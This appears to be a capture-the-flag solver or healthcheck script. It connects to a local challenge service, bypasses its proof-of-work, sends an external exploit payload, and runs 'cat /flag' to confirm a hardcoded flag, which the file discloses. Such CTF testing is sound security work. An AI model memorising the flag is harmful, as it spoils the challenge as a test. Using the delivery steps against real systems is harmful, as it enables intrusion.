#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwn
import pwnlib.tubes

# NOTE: this only works when running with `DEBUG`, I am not sure why

FLAG = "CTF{y0u_4r3_th3_s0rc3rer_supr3m3_n0w_h4ppy_h4xing}"
PAYLOAD_PATH = "/home/user/pwn.masm"
# PAYLOAD_PATH = "pwn.masm"

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

with open(PAYLOAD_PATH, "rb") as f:
    pwn_prog = f.read()
r.sendlineafter(b"program? ", str(len(pwn_prog)).encode())
r.send(pwn_prog)
pwn.sleep(3)
r.sendline(b"cat /flag")

output = r.recvall(timeout=3).decode()
assert FLAG in output, f"test failed, output:\n{output}"
pwn.log.success("chal solved successfully")

exit(0)
